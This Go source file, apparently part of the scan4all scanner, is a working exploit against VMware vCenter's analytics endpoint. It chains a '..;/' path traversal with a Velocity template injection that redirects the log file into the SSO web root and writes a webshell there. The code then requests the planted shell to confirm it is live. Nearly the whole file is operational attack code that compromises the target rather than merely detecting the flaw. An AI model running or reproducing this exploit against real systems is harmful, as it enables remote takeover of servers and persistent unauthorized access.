package vCenter

import (
	"fmt"
	"github.com/GhostTroops/scan4all/lib/util"
	"io"
	"net/http"
	"strings"
)

func Create_agent(szUrl, log_param, agent_name string) {
	szUrl = util.GetUrlHost(szUrl)
	target := fmt.Sprintf("%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=%s&_i=%s", szUrl, agent_name, log_param)
	body := `{"manifestSpec":{},
	"objectType": "a2",
	"collectionTriggerDataNeeded": true,
	"deploymentDataNeeded":true,
	"resultNeeded": true,
	"signalCollectionCompleted":true,
	"localManifestPath": "a7",
	"localPayloadPath": "a8",
	"localObfuscationMapPath": "a9"}`
	myheader := map[string]string{"Cache-Control": "max-age=0",
		"Upgrade-Insecure-Requests": "1",
		"User-Agent":                "Mozilla/5.0",
		"X-Deployment-Secret":       "abc",
		"Content-Type":              "application/json",
		"Connection":                "close"}
	util.SendData2Url(target, body, &myheader, func(resp *http.Response, err error, szU string) {
		if nil != resp {
			io.Copy(io.Discard, resp.Body)
		}
	})
}
func str_to_escape(str string) string {
	// byte_str := []byte(str)
	res := ""
	for _, value := range str {
		// fmt.Print(value)
		// a, err := strconv.Atoi(string(value))
		// _ = err
		s := fmt.Sprintf("\\\\u%04x", string(value))
		// fmt.Println(s)
		res += s
	}
	return res
}

func get_data(str string) string {
	a := strings.Replace(str, "\n", "\\n", -1)
	a = strings.Replace(a, "\t", "        ", -1)
	a = strings.Replace(a, "\"", "\\\"", -1)
	return a

}
func generate_manifest(webshell_location, webshell string) string {
	ss := `<manifest recommendedPageSize="500">
	<request>
	 <query name="vir:VCenter">
	   <constraint>
		<targetType>ServiceInstance</targetType>
	   </constraint>
	   <propertySpec>
		<propertyNames>content.about.instanceUuid</propertyNames>
		<propertyNames>content.about.osType</propertyNames>
		<propertyNames>content.about.build</propertyNames>
		<propertyNames>content.about.version</propertyNames>
	   </propertySpec>
	 </query>
	</request>
	<cdfMapping>
	 <indepedentResultsMapping>
	   <resultSetMappings>
		<entry>
		  <key>vir:VCenter</key>
		  <value>
<value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
			 <resourceItemToJsonLdMapping>
			  <forType>ServiceInstance</forType>
			 <mappingCode><![CDATA[  
#set($appender = $GLOBAL-logger.logger.parent.getAppender("LOGFILE"))##
#set($orig_log = $appender.getFile())##
#set($logger = $GLOBAL-logger.logger.parent)##  
$appender.setFile("%s")##  
$appender.activateOptions()## 
$logger.warn("%s")## 
$appender.setFile($orig_log)##  
$appender.activateOptions()##]]>
			 </mappingCode>
			 </resourceItemToJsonLdMapping>
		   </value>
		  </value>
		</entry>
	   </resultSetMappings>
	 </indepedentResultsMapping>
	</cdfMapping>
	<requestSchedules>
	 <schedule interval="1h">
	   <queries>
		<query>vir:VCenter</query>
	   </queries>
	 </schedule>
	</requestSchedules>
  </manifest>`
	a := fmt.Sprintf(ss, webshell_location, webshell)
	return a
}

func Upload_shell(szUrl, log_param, agent_name, wb_str string) string {
	szUrl = util.GetUrlHost(szUrl)
	tarGet := fmt.Sprintf("%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=%s&_i=%s", szUrl, agent_name, log_param)
	webshell := util.X3Webshell
	if len(wb_str) > 1 {
		webshell = wb_str
	}
	webshell_str := str_to_escape(webshell)
	manifest_data := get_data(generate_manifest("/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/"+util.WebShellName, webshell_str))
	myheader := map[string]string{"Cache-Control": "max-age=0",
		"Upgrade-Insecure-Requests": "1",
		"User-Agent":                "Mozilla/5.0",
		"X-Deployment-Secret":       "abc",
		"Content-Type":              "application/json",
		"Connection":                "close"}
	data := fmt.Sprintf("{\"contextData\": \"a3\",\"%s\":\"%s\",\"objectId\": \"a2\"}", "manifestContent", manifest_data)
	// fmt.Println(jsonText)
	szRst := ""
	util.SendData2Url(tarGet, data, &myheader, func(resp *http.Response, err error, szU string) {
		if nil != resp && (resp.StatusCode == 201 || resp.StatusCode == 200) {
			io.Copy(io.Discard, resp.Body)
			// check shell
			util.SendData2Url(szUrl+"/idm/..;/"+util.WebShellName, "", &myheader, func(resp *http.Response, err error, szU string) {
				if nil != resp {
					io.Copy(io.Discard, resp.Body)
					if resp.StatusCode == 200 {
						szRst = szU
						fmt.Println("[+] 上传成功，检查Webshell: " + szU)
					}
				}
			})
		}
	})
	return szRst
}

func CheckVul001(szUrl string) (string, bool) {
	log_param := util.GeneratorId(2)
	agent_name := util.GeneratorId(5)
	Create_agent(szUrl, log_param, agent_name)
	szRst := Upload_shell(szUrl, log_param, agent_name, "")
	return szRst, "" != szRst
}
